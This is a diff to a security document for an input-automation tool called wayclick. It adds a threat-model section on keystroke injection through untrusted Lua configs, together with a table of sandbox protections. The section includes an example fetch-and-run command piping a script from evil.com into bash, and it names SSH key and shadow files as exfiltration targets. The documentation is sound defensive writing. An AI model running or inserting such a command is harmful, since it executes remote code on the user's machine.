@@ -49,9 +49,40 @@ Even if a Lua config could read sensitive files, there is **no exfiltration chan
 | Shell commands        | Blocked  | `os.execute` and `io.popen` are nil.                     |
 | File writes           | Blocked  | `io.open` rejects write and append modes.                |
 | Dynamic code loading  | Blocked  | `load`, `loadfile`, `dofile` are nil.                    |
-| Encoding into actions | Not viable | Lua runs only at config-load time. Action constructors return static config tables — file contents cannot be dynamically injected into keystrokes or mouse actions at runtime. |
+| Encoding into actions | Mitigated | Lua *can* build `key_press` sequences dynamically at config-load time. However, `io.open` is restricted to the config directory — no sensitive data is available to encode. See [Keystroke Injection](#keystroke-injection-and-untrusted-configs) below. |
 
 With `io.open` now restricted to the config directory, this is defense-in-depth: even if an exfiltration channel were discovered, the readable file set is limited to the user's own config files.
+
+### Keystroke Injection and Untrusted Configs
+
+> **⚠️ Never load a wayclick config from an untrusted source without reviewing it first.** This is the same guidance that applies to shell scripts, AutoHotkey scripts, VS Code extensions, and any other tool that can automate input.
+
+Wayclick's core purpose is keystroke and mouse injection. A malicious config could use `key_press` + `sequence` to type arbitrary pre-baked commands (e.g., `curl https://evil.com/backdoor.sh | bash`) when the user presses a bound button — just as any AHK script or shell alias could do.
+
+**Why this is an inherent capability, not a bug:**
+
+- Input injection is the tool's stated purpose
+- Removing it would make the tool non-functional
+- Every input automation tool (AutoHotkey, xdotool, xbindkeys, etc.) has this same property
+
+**Why data exfiltration via keystrokes is not viable:**
+
+A more sophisticated attack would attempt to read sensitive files, encode their contents into keystrokes, and type them into a `curl` command in a terminal. This is blocked by defense-in-depth:
+
+1. **`io.open` is restricted to the config directory** — an attacker cannot read `~/.ssh/id_rsa`, `/etc/shadow`, or any file outside `~/.config/wayclick/`. The only readable files are the attacker's own config.
+2. **No automatic terminal detection** — profile rules (`match_app`) are defined in the config schema but are not implemented in the engine. A config cannot auto-detect when a terminal emulator is focused.
+3. **Requires explicit user interaction** — all actions require the user to press a specific bound button. There is no auto-fire-on-load mechanism.
+4. **No network access** — Lua cannot make HTTP requests, open sockets, or execute shell commands.
+
+**Defense-in-depth summary:**
+
+| Layer | Protection |
+|-------|-----------|
+| Data collection | `io.open` restricted to config directory |
+| Data encoding | Keystroke sequences can only contain static, pre-baked content |
+| Trigger mechanism | Requires physical button press by the user |
+| Terminal detection | Profile rules not implemented in engine |
+| Network egress | No sockets, no HTTP, no shell in Lua sandbox |
 
 ### Keylogging Considerations
 
@@ -83,10 +114,11 @@ This is a "user configures their own keylogger" scenario — equivalent to runni
 
 ## Recommendations
 
-1. **Do not run as root.** Use the systemd user service.
-2. **Audit your Lua config** before sharing it with others.
-3. **Keep wayclick updated** to receive security fixes.
-4. Use `wayclickd --check-permissions` to verify minimal access.
+1. **Never run untrusted configs.** Always review Lua configs before loading them — treat them like shell scripts.
+2. **Do not run as root.** Use the systemd user service.
+3. **Audit your Lua config** before sharing it with others.
+4. **Keep wayclick updated** to receive security fixes.
+5. Use `wayclickd --check-permissions` to verify minimal access.
 
 ## Reporting Vulnerabilities
 
